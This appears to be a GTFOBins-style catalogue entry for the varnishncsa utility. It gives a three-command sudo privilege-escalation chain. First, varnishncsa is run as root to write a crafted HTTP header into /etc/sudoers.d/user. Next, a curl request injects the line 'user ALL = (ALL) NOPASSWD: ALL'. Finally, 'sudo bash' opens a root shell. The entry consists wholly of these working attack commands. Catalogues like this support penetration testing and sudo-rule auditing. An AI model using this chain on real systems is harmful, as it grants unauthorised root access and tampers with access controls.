---
description: varnishncsa utility reads varnishd shared memory Varnish logs and presents them in the Apache / NCSA "combined" log format.
functions:
    sudo:
        - code: sudo varnishncsa -g request -q "ReqURL ~ \"/exploit_randomfoo\"" -F '%{exploit}i' -w /etc/sudoers.d/user &
        - code: curl -H 'exploit: user ALL = (ALL) NOPASSWD: ALL' localhost:6081/exploit_randomfoo
        - code: sudo bash
---